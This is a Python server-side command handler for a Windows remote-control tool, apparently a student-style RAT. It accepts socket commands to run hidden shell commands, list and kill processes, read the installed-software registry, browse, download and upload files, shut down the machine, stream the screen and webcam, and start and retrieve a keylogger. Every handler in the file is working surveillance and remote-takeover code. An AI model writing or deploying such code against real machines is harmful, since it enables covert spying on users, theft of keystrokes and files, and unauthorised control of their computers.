# -*- coding: utf-8 -*-
"""
server/handlers.py - Xử lý từng lệnh (command) nhận được từ client.
Mỗi handler nhận (conn, command, server_state) và trả về kết quả qua socket.
"""
import os
import shutil
import struct
import platform
import ctypes
import subprocess
import threading

from server.streaming import stream_screen, stream_webcam

CREATE_NO_WINDOW = 0x08000000


def recvall(conn, n):
    data = bytearray()
    while len(data) < n:
        packet = conn.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


def handle_client(conn, addr, server_state, log_fn):
    """
    Vòng lặp xử lý lệnh từ một client.
    server_state: dict chứa trạng thái chia sẻ (is_running, is_streaming, is_webcam_streaming, keylogger).
    """
    keylogger = server_state['keylogger']
    is_streaming_ref = [False]
    is_webcam_ref = [False]

    while server_state['is_running']:
        try:
            command = conn.recv(1024).decode('utf-8', errors='replace')
            if not command:
                log_fn(f"[-] Client disconnected: {addr[0]}:{addr[1]}")
                break

            if command not in ["START_STREAM", "STOP_STREAM", "GET_KEYLOG", "START_WEBCAM", "STOP_WEBCAM"]:
                log_fn(f"[CMD] Rcv: {command}")

            # ── Terminal ──────────────────────────────────────────────────
            if command.startswith("CMD_EXEC:"):
                _, cmd = command.split(":", 1)
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True,
                        errors='replace', creationflags=CREATE_NO_WINDOW
                    )
                    output = result.stdout if result.stdout else result.stderr
                    if not output.strip():
                        output = "Command executed successfully."
                except Exception as e:
                    output = f"Execution Error: {e}"
                out_bytes = output.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(out_bytes)))
                conn.sendall(out_bytes)

            # ── System Info ───────────────────────────────────────────────
            elif command == "GET_SYSINFO":
                try:
                    class MEMORYSTATUSEX(ctypes.Structure):
                        _fields_ = [
                            ("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                            ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                            ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                            ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                            ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                        ]
                    ram_str, disk_str = "N/A", "N/A"
                    try:
                        stat = MEMORYSTATUSEX()
                        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
                        ram_str = f"{round(stat.ullTotalPhys/(1024**3),2)} GB (Free: {round(stat.ullAvailPhys/(1024**3),2)} GB)"
                    except:
                        pass
                    try:
                        total_d, _, free_d = shutil.disk_usage("C:\\")
                        disk_str = f"{round(total_d/(1024**3),2)} GB (Free: {round(free_d/(1024**3),2)} GB)"
                    except:
                        pass
                    info = (
                        "=== SYSTEM INFORMATION ===\n\n"
                        f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
                        f"Hostname: {platform.node()}\n"
                        f"CPU: {platform.processor()}\n"
                        f"Physical RAM: {ram_str}\n"
                        f"Local Disk (C:): {disk_str}\n"
                    )
                except Exception as e:
                    info = f"Error: {e}"
                info_bytes = info.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(info_bytes)))
                conn.sendall(info_bytes)

            # ── Task Manager ──────────────────────────────────────────────
            elif command == "LIST_APP":
                ps_cmd = (
                    'Get-Process | Where-Object {$_.MainWindowTitle} | '
                    'Select-Object Name, Id, MainWindowTitle | ConvertTo-Csv -NoTypeInformation'
                )
                result = subprocess.run(
                    ['powershell', '-Command', ps_cmd],
                    capture_output=True, text=True, errors='replace', creationflags=CREATE_NO_WINDOW
                )
                app_data = result.stdout.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(app_data)))
                conn.sendall(app_data)

            elif command == "LIST_PROCESS":
                result = subprocess.run(
                    ['tasklist', '/FO', 'CSV', '/NH'],
                    capture_output=True, text=True, errors='replace', creationflags=CREATE_NO_WINDOW
                )
                process_data = result.stdout.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(process_data)))
                conn.sendall(process_data)

            elif command.startswith("KILL_PROCESS"):
                _, target = command.split(":", 1)
                if target.isdigit():
                    result = subprocess.run(
                        ['taskkill', '/F', '/PID', target],
                        capture_output=True, text=True, errors='replace', creationflags=CREATE_NO_WINDOW
                    )
                else:
                    result = subprocess.run(
                        ['taskkill', '/F', '/IM', target],
                        capture_output=True, text=True, errors='replace', creationflags=CREATE_NO_WINDOW
                    )
                response = result.stdout if result.returncode == 0 else result.stderr
                response_bytes = response.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(response_bytes)))
                conn.sendall(response_bytes)

            elif command.startswith("START_PROCESS"):
                _, target = command.split(":", 1)
                try:
                    subprocess.Popen(target, shell=True, creationflags=CREATE_NO_WINDOW)
                    response = f"Launch command sent for '{target}'!"
                except Exception as e:
                    response = f"Launch error: {e}"
                response_bytes = response.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(response_bytes)))
                conn.sendall(response_bytes)

            # ── Installed Software ────────────────────────────────────────
            elif command == "LIST_INSTALLED_APPS":
                ps_cmd = (
                    '$paths = @('
                    '"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",'
                    '"HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",'
                    '"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"'
                    ');'
                    'Get-ItemProperty $paths | Where-Object { $_.DisplayName -and $_.SystemComponent -ne 1 -and $_.DisplayName -notlike "Update for*" } | '
                    'Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, DisplayIcon | '
                    'Sort-Object DisplayName | ConvertTo-Csv -NoTypeInformation'
                )
                result = subprocess.run(
                    ['powershell', '-Command', ps_cmd],
                    capture_output=True, text=True, errors='replace', creationflags=CREATE_NO_WINDOW
                )
                app_data = result.stdout.encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(app_data)))
                conn.sendall(app_data)

            # ── File Manager ──────────────────────────────────────────────
            elif command.startswith("FILE_LIST:"):
                _, path = command.split(":", 1)
                if not path:
                    path = "C:\\"
                try:
                    items = []
                    for item in os.listdir(path):
                        full_path = os.path.join(path, item)
                        if os.path.isdir(full_path):
                            items.append(f"DIR|{item}|0")
                        else:
                            items.append(f"FILE|{item}|{os.path.getsize(full_path)}")
                    response = "\n".join(items).encode('utf-8', errors='replace')
                except Exception as e:
                    response = f"ERROR|{str(e)}|0".encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(response)))
                conn.sendall(response)

            elif command.startswith("FILE_DOWNLOAD:"):
                _, filepath = command.split(":", 1)
                try:
                    with open(filepath, 'rb') as f:
                        file_data = f.read()
                    header = b"SUCCESS"
                    conn.sendall(struct.pack('>I', len(header)))
                    conn.sendall(header)
                    conn.sendall(struct.pack('>I', len(file_data)))
                    conn.sendall(file_data)
                except Exception as e:
                    err = f"ERROR:{str(e)}".encode('utf-8', errors='replace')
                    conn.sendall(struct.pack('>I', len(err)))
                    conn.sendall(err)

            elif command.startswith("FILE_UPLOAD:"):
                _, save_path = command.split(":", 1)
                raw_size = recvall(conn, 4)
                file_size = struct.unpack('>I', raw_size)[0]
                file_data = recvall(conn, file_size)
                try:
                    with open(save_path, 'wb') as f:
                        f.write(file_data)
                    resp = f"File saved successfully at {save_path}".encode('utf-8', errors='replace')
                except Exception as e:
                    resp = f"Save error: {e}".encode('utf-8', errors='replace')
                conn.sendall(struct.pack('>I', len(resp)))
                conn.sendall(resp)

            # ── Screen Streaming ──────────────────────────────────────────
            elif command == "START_STREAM":
                is_streaming_ref[0] = True
                threading.Thread(
                    target=stream_screen, args=(conn, is_streaming_ref), daemon=True
                ).start()
            elif command == "STOP_STREAM":
                is_streaming_ref[0] = False

            # ── Webcam Streaming ──────────────────────────────────────────
            elif command == "START_WEBCAM":
                is_webcam_ref[0] = True
                threading.Thread(
                    target=stream_webcam, args=(conn, is_webcam_ref, log_fn), daemon=True
                ).start()
            elif command == "STOP_WEBCAM":
                is_webcam_ref[0] = False

            # ── Power ─────────────────────────────────────────────────────
            elif command == "SYS_SHUTDOWN":
                subprocess.run(['shutdown', '/s', '/t', '0'], creationflags=CREATE_NO_WINDOW)
            elif command == "SYS_RESTART":
                subprocess.run(['shutdown', '/r', '/t', '0'], creationflags=CREATE_NO_WINDOW)
            elif command == "SYS_SLEEP":
                subprocess.run(
                    ['rundll32.exe', 'powrprof.dll,SetSuspendState', '0,1,0'],
                    creationflags=CREATE_NO_WINDOW
                )

            # ── Keylogger ─────────────────────────────────────────────────
            elif "START_KEYLOG" in command or "GET_KEYLOG" in command or "STOP_KEYLOG" in command:
                if "START_KEYLOG" in command:
                    keylogger.start()
                if "STOP_KEYLOG" in command:
                    keylogger.stop()
                if "GET_KEYLOG" in command:
                    log_data = keylogger.get_and_clear()
                    log_bytes = log_data.encode('utf-8', errors='replace')
                    conn.sendall(struct.pack('>I', len(log_bytes)))
                    conn.sendall(log_bytes)

        except Exception as e:
            log_fn(f"[-] Connection dropped: {e}")
            is_streaming_ref[0] = False
            is_webcam_ref[0] = False
            keylogger.stop()
            break

    conn.close()
